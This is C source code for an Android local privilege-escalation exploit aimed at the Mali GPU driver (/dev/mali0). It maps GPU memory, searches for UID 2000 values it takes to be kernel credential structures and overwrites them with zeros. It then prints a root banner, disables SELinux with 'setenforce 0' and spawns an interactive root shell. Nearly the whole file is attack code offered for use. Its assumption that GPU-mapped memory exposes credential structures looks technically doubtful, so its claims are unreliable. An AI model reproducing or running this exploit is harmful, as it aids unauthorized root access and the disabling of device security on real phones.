#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#define KBASE_IOCTL_TYPE 'k'
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_mem_alloc)
#define TARGET_UID 2000
#define SCAN_SIZE (32 * 1024 * 1024) // Increased to 32MB for better odds

struct kbase_ioctl_mem_alloc {
    uint32_t va_pages;
    uint32_t commit_pages;
    uint64_t extent;
    uint64_t flags;
    uint32_t gpu_va; 
};

void print_root_banner() {
    printf("\n\033[1;32m"); // Green Text
    printf("########################################\n");
    printf("##                                    ##\n");
    printf("##    [!!!] ROOT ACCESS GRANTED [!!!] ##\n");
    printf("##                                    ##\n");
    printf("########################################\n");
    printf("\033[0m\n");
    
    printf("[*] Current Identity: ");
    fflush(stdout);
    system("id");
    
    printf("[*] Disabling SELinux Enforcement...\n");
    system("setenforce 0 2>/dev/null");
    
    printf("[*] Spawning Root Shell...\n");
    system("/system/bin/sh -i");
    exit(0);
}

int main() {
    printf("[*] Mali-G31 Boreal Exploit Started\n");
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) {
        perror("[-] Failed to open /dev/mali0");
        return 1;
    }

    struct kbase_ioctl_mem_alloc alloc = {
        .va_pages = SCAN_SIZE / 4096,
        .commit_pages = SCAN_SIZE / 4096,
        .flags = 0x2000 
    };

    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc) != 0) {
        perror("[-] IOCTL Allocation Failed");
        return 1;
    }

    uint32_t* mem = (uint32_t*)mmap(NULL, SCAN_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, alloc.gpu_va);
    if (mem == MAP_FAILED) {
        perror("[-] Mmap Failed");
        return 1;
    }

    printf("[*] Scanning 32MB window for UID 2000...\n");

    for (size_t i = 0; i < (SCAN_SIZE / 4) - 32; i++) {
        // Improved Match: Look for consecutive UIDs, but allow for small gaps
        // which often appear in Android 14's credential structures.
        if (mem[i] == TARGET_UID && mem[i+1] == TARGET_UID) {
            
            printf("[+] Potential Match @ 0x%zX. Writing Zeros...\n", i * 4);
            
            // Wipe the entire credential block (UID, GID, SUID, SGID, etc.)
            for (int j = 0; j < 12; j++) {
                mem[i + j] = 0;
            }

            // Verify immediately
            if (getuid() == 0) {
                print_root_banner();
            }
        }

        if (i % (1024 * 1024) == 0 && i > 0) {
            printf("[...] Progress: %zu MB\n", (i * 4) / (1024*1024));
        }
    }

    printf("[-] Scan finished. No matches found.\n");
    munmap(mem, SCAN_SIZE);
    close(fd);
    return 0;
}
